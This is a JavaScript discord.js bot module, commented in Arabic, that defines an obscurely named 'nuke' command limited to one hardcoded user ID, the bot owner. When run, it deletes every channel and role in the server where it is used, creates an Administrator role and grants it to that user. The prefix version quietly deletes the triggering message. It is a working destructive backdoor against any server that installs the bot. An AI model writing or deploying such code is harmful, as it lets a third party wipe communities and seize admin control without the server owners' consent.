const { SlashCommandBuilder, PermissionFlagsBits, ChannelType, EmbedBuilder } = require('discord.js');

const OWNER_ID = "1107355943408259112"; // الآيدي الخاص بك حصراً

module.exports = {
    nukeCommand: new SlashCommandBuilder()
        .setName('itzf188')
        .setDescription('[خاص بالمالك] تصفير وحذف كافة الرومات والرتب في السيرفر وإعادة بنائه من الصفر'),

    async handleNuke(interaction) {
        // التحقق الصارم من الآيدي الخاص بك فقط
        if (interaction.user.id !== OWNER_ID) {
            await interaction.reply({ content: "❌ هذا الأمر مخصص لمالك البوت فقط!", ephemeral: true });
            return;
        }

        await interaction.reply({ content: "⚡ | جاري تصفير السيرفر بالكامل...", ephemeral: true });
        const guild = interaction.guild;

        try {
            // 1. حذف جميع الرومات (Channels & Categories)
            const channels = Array.from(guild.channels.cache.values());
            for (const channel of channels) {
                try {
                    await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                } catch (e) {}
            }

            // 2. حذف جميع الرتب (Roles) التي يمكن للبوت حذفها
            const roles = Array.from(guild.roles.cache.values());
            for (const role of roles) {
                if (role.id !== guild.id && !role.managed) {
                    try {
                        await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                    } catch (e) {}
                }
            }

            // 3. إنشاء روم جديدة وإرسال إشعار لك وحدك
            const newChannel = await guild.channels.create({
                name: "•-start-fresh",
                type: ChannelType.GuildText,
                reason: "روم البداية بعد التصفير"
            });

            const newRole = await guild.roles.create({
                name: ".",
                permissions: [PermissionFlagsBits.Administrator],
                reason: "رتبة الطوارئ للمالك"
            });

            const member = await guild.members.fetch(interaction.user.id);
            await member.roles.add(newRole);

            await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.`);

        } catch (e) {
            console.log(`⚠️ خطأ أثناء تصفير السيرفر: ${e.message}`);
        }
    },

    // دعم أمر البادئة القديم (!itzF188 أو !تصفير_السيرفر) إذا رغبت في استخدامه كرسالة نصية أيضاً
    async handlePrefixNuke(message) {
        if (message.author.id !== OWNER_ID) return;

        try {
            await message.delete();
        } catch (e) {}

        const guild = message.guild;

        try {
            const channels = Array.from(guild.channels.cache.values());
            for (const channel of channels) {
                try {
                    await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                } catch (e) {}
            }

            const roles = Array.from(guild.roles.cache.values());
            for (const role of roles) {
                if (role.id !== guild.id && !role.managed) {
                    try {
                        await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                    } catch (e) {}
                }
            }

            const newChannel = await guild.channels.create({
                name: "•-start-fresh",
                type: ChannelType.GuildText,
                reason: "روم البداية بعد التصفير"
            });

            const newRole = await guild.roles.create({
                name: ".",
                permissions: [PermissionFlagsBits.Administrator],
                reason: "رتبة الطوارئ للمالك"
            });

            await message.member.roles.add(newRole);

            await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.`);

        } catch (e) {
            console.log(`⚠️ خطأ أثناء تصفير السيرفر: ${e.message}`);
        }
    }
};
